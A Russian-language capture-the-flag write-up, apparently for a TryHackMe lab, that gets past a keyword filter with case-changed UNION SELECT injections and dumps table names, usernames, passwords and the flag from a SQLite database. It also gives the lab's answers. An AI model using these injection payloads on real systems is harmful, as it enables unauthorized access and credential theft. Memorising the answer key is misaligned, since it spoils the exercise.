Подключимся к машине:

`nc MACHINE_IP 1337`

После подключения можно увидеть:

`Please enter your username: `

Попробуем ввести "smokey":

`Password: vYQ5ngPpw8AdUmL`

Попробуем ввести sql инъекцию:

```
Please enter your username: ' UNION SELECT '1
Ahh there is a word in there I don't like :(
```

Программа не пропускает sql запросы, но мы можем заменить написать их подругому, например `' Union Select 1'`. Такой запрос программа пропускает: 

```
Please enter your username: ' Union Select '1
Password: 1
```

Теперь нужно получить название таблицы в которой хранятся имена и пароли пользователей:

```
Please enter your username: ' Union Select name From sqlite_master Where type='table
Password: admintable
```

Итак, мы получили название таблицы: **admintable**. Теперь мы можем получить имена пользователей из этой таблицы:

```
Please enter your username: ' Union Select username From admintable Where username!='smokey
Password: TryHackMeAdmin
```

Мы нашли имя пользователя админа **TryHackMeAdmin** это и есть ответ на первый вопрос.

Также можно посмотреть остальные имена пользователей: 

```
Please enter your username: ' Union Select username From admintable Where username!='smokey' And username!='TryHackMeAdmin
Password: flag
```

мы нашли еще одного пользователя: **flag**

Теперь мы можем получить пароли пользователей **flag** и  **TryHackMeAdmin**:

Узнаем пароль пользователя **TryHackMeAdmin**:
```
Please enter your username: ' Union Select password From admintable Where username='TryHackMeAdmin
Password: mamZtAuMlrsEy5bp6q17
```

Ответ на второй вопрос: `mamZtAuMlrsEy5bp6q17`

Узнаем пароль пользователя **flag**:
```
Please enter your username: ' Union Select password From admintable Where username='flag
Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

Овет на третий вопрос: `THM{SQLit3_InJ3cTion_is_SimplE_nO?}`